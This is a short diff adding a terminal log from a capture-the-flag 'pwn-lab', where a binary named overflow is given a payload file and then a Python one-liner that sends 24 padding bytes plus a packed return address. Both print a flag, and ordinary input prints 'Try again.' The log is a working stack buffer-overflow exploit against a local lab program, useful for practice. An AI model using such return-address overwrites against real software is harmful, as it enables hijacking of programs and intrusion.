@@ -1,0 +1,11 @@
+mzj@Ubuntu-24.04:~$ cd ~/pwn-lab && ./overflow < payload.bin
+Name:
+flag{control_flow_redirected}
+
+mzj@Ubuntu-24.04:~$ cd ~/pwn-lab && python3 -c "import struct,sys;sys.stdout.buffer.write(b'A'*24+struct.pack('<Q',0x401190))" | ./overflow
+Name:
+flag{control_flow_redirected}
+
+mzj@Ubuntu-24.04:~$ cd ~/pwn-lab && echo alice | ./overflow
+Name:
+Try again.
